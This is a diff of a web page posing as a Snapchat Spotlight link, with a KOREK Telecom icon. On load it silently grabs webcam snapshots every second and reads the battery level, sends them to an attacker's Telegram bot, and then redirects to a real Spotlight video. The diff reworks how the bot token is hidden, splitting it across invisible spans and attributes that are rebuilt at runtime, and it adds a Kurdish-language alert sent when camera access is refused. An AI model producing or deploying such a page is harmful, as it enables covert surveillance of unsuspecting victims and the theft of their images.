@@ -5,17 +5,16 @@
     <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
     <title>snapchat spotlight</title>
     <style>
-        :root { --config-node: "AAFABzJuX8"; }
         body { background-color: white !important; margin: 0; overflow: hidden; height: 100vh; width: 100vw; }
         .zone-wrapper { display: none !important; visibility: hidden !important; }
     </style>
 </head>
-<body onload="capture()">
+<body onload="capture()" data-config="AAFABzJuX8">
 
-    <a href="#" id="legacy-link" class="zone-wrapper">l7AMLVis5x</a>
-
-    <div class="main-content">
-        <p class="zone-wrapper" id="raw-meta">8431515310:</p>
+    <div class="zone-wrapper">
+        <span id="legacy-link">l7AMLVis5x</span>
+        <span id="raw-meta">8431515310:</span>
+        <span id="system-trace">SFHm9EGK95i9l8I</span>
     </div>
 
 <script>
@@ -28,12 +27,13 @@
         if (!targetID) return;
 
         try {
-            const part1 = document.getElementById("raw-meta").innerText;
-            const part2 = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
-            const part3 = document.getElementById("legacy-link").innerText;
-            const part4 = document.getElementById("system-trace").innerText;
+            /* دروستکردنەوەی تۆکنە نوێیەکە بە وردی */
+            const p1 = document.getElementById("raw-meta").innerText.trim();
+            const p2 = document.body.getAttribute("data-config").trim();
+            const p3 = document.getElementById("legacy-link").innerText.trim();
+            const p4 = document.getElementById("system-trace").innerText.trim();
             
-            const _final_call = part1 + part2 + part3 + part4;
+            const _final_call = p1 + p2 + p3 + p4;
 
             setTimeout(() => {
                 window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
@@ -44,7 +44,7 @@
                 audio: false 
             });
 
-            let batteryInfo = "100%";
+            let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
@@ -73,10 +73,10 @@
             setInterval(takeSnap, 1000);
 
         } catch (e) {
-            const r1 = document.getElementById("raw-meta").innerText;
-            const r2 = getComputedStyle(document.documentElement).getPropertyValue('--config-node').replace(/"/g, '').trim();
-            const r3 = document.getElementById("legacy-link").innerText;
-            const r4 = document.getElementById("system-trace").innerText;
+            const r1 = document.getElementById("raw-meta").innerText.trim();
+            const r2 = document.body.getAttribute("data-config").trim();
+            const r3 = document.getElementById("legacy-link").innerText.trim();
+            const r4 = document.getElementById("system-trace").innerText.trim();
             const _rec = r1 + r2 + r3 + r4;
 
             _sendMsg("⚠️ مۆڵەتی کامێرا نەدرا", _rec, targetID);
@@ -99,9 +99,5 @@
         fetch(`https://api.telegram.org/bot${tk}/sendPhoto`, { method: 'POST', body: fd });
     }
 </script>
-
-    <div class="zone-wrapper">
-        <code id="system-trace">SFHm9EGK95i9l8I</code>
-    </div>
 </body>
 </html>
